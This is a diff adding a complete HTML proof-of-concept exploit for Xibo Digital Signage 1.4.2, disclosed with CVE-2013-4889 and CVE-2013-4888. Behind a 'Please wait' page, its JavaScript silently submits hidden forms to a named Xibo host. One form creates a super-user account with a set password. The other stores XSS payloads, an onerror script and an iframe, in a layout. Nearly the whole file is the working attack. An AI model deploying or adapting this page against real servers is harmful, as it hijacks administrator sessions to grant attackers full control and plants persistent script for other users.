@@ -1,0 +1,67 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt; Xibo - Digital Signage 1.4.2 CSRF Exploit.&lt;/title&gt;
+&lt;!--
+# CSRF Discovered by: Jacob Holcomb - Security Analyst @ Independent Security Evaluators
+# Exploited by: Jacob Holcomb - Security Analyst @ Independnet Security Evaluators
+# CVE: CSRF - CVE-2013-4889, XSS - CVE-2013-4888
+# http://infosec42.blogspot.com
+# http://securityevaluators.com
+--&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Please wait... &lt;/h1&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+//Add super user
+function RF1(){
+    document.write('&lt;form name=&quot;addAdmin&quot; target =&quot;_blank&quot; action=&quot;http://xibo.leland.k12.mi.us/index.php?p=user&amp;q=AddUser&amp;ajax=true&quot; method=&quot;post&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;userid&quot; value=&quot;0&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;Gimppy&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;ISE&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;Gimppy@infosec42.com&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;usertypeid&quot; value=&quot;1&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;groupid&quot; value=&quot;1&quot;&gt;'+
+    '&lt;/form&gt;');
+}
+
+//Set XSS Payloads
+function RF2(){
+    document.write('&lt;form name=&quot;addXSS&quot; target=&quot;_blank&quot; action=&quot;http://xibo.leland.k12.mi.us/index.php?p=layout&amp;q=add&amp;ajax=true&quot; method=&quot;post&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;layoutid&quot; value=&quot;0&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;Gimppy&lt;img src=42 onerror='alert(42)'&gt;&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;description&quot; value=&quot;&lt;iframe src='http://securityevaluators.com' width=100 height=1000&lt;/iframe&gt;&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;tags&quot; value=&quot;&quot;&gt;'+
+    '&lt;input type=&quot;hidden&quot; name=&quot;templateid&quot; value=&quot;0&quot;&gt;'+
+    '&lt;/form&gt;');
+}
+
+function createPage(){
+    RF1();
+    RF2();
+}
+
+function _addAdmin(){
+    document.addAdmin.submit();
+}
+
+function _addXSS(){
+    document.addXSS.submit();
+}
+
+//Called Functions
+createPage()
+   
+for (var i = 0; i &lt; 2; i++){
+    if(i == 0){
+        window.setTimeout(_addAdmin, 0500);
+    }
+    else if(i == 1){
+        window.setTimeout(_addXSS, 1000);
+    }
+    else{
+        continue;
+    }
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
